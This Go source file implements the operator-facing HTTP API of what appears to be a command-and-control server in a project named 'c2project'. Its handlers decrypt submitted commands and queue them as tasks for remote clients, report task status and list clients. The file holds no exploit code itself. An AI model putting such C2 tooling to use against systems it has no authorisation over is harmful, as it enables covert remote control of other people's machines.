// Package httpapi реализует HTTP-сервер для терминала оператора.
package httpapi

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/http"

	"c2project/internal/crypto"
	"c2project/internal/protocol"
	"c2project/internal/service"
	"c2project/internal/storage"
)

// Handler содержит HTTP-хендлеры для терминала.
type Handler struct {
	svc *service.Service
}

// NewHandler создаёт Handler.
func NewHandler(svc *service.Service) *Handler {
	return &Handler{svc: svc}
}

// Submit обрабатывает POST /api/submit — постановку задачи.
// Хендлер принимает запрос, валидирует его, вызывает сервис.
func (h *Handler) Submit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	var req protocol.SubmitRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid json")
		return
	}
	if err := validateSubmit(&req); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	plain, err := decryptTerminalCommand(req.Command)
	if err != nil {
		writeError(w, http.StatusBadRequest, "decrypt failed")
		return
	}
	taskID, err := h.svc.CreateTask(req.ClientID, string(plain))
	if err != nil {
		if errors.Is(err, storage.ErrClientNotFound) {
			writeError(w, http.StatusNotFound, "unknown client")
			return
		}
		writeError(w, http.StatusInternalServerError, "create task failed")
		return
	}
	writeJSON(w, http.StatusOK, protocol.SubmitResponse{TaskID: taskID})
}

// Status обрабатывает GET /api/status — получение статуса задачи.
func (h *Handler) Status(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Query().Get("id")
	if taskID == "" {
		writeError(w, http.StatusBadRequest, protocol.ErrEmptyTaskID.Error())
		return
	}
	resp, err := h.svc.GetStatus(taskID)
	if err != nil {
		if errors.Is(err, storage.ErrTaskNotFound) {
			writeError(w, http.StatusNotFound, "task not found")
			return
		}
		writeError(w, http.StatusInternalServerError, "status failed")
		return
	}
	writeJSON(w, http.StatusOK, resp)
}

// Clients обрабатывает GET /api/clients — список клиентов.
func (h *Handler) Clients(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, h.svc.ListClients())
}

// validateSubmit валидирует тело запроса на постановку задачи.
func validateSubmit(req *protocol.SubmitRequest) error {
	if req.ClientID == "" {
		return protocol.ErrEmptyClientID
	}
	if req.Command == "" {
		return protocol.ErrEmptyCommand
	}
	return nil
}

// decryptTerminalCommand декодирует base64 и расшифровывает команду.
func decryptTerminalCommand(b64 string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, err
	}
	return crypto.Decrypt(protocol.KeyTerminalToC2, raw)
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	if err := json.NewEncoder(w).Encode(v); err != nil {
		http.Error(w, "encode failed", http.StatusInternalServerError)
	}
}

func writeError(w http.ResponseWriter, code int, msg string) {
	http.Error(w, msg, code)
}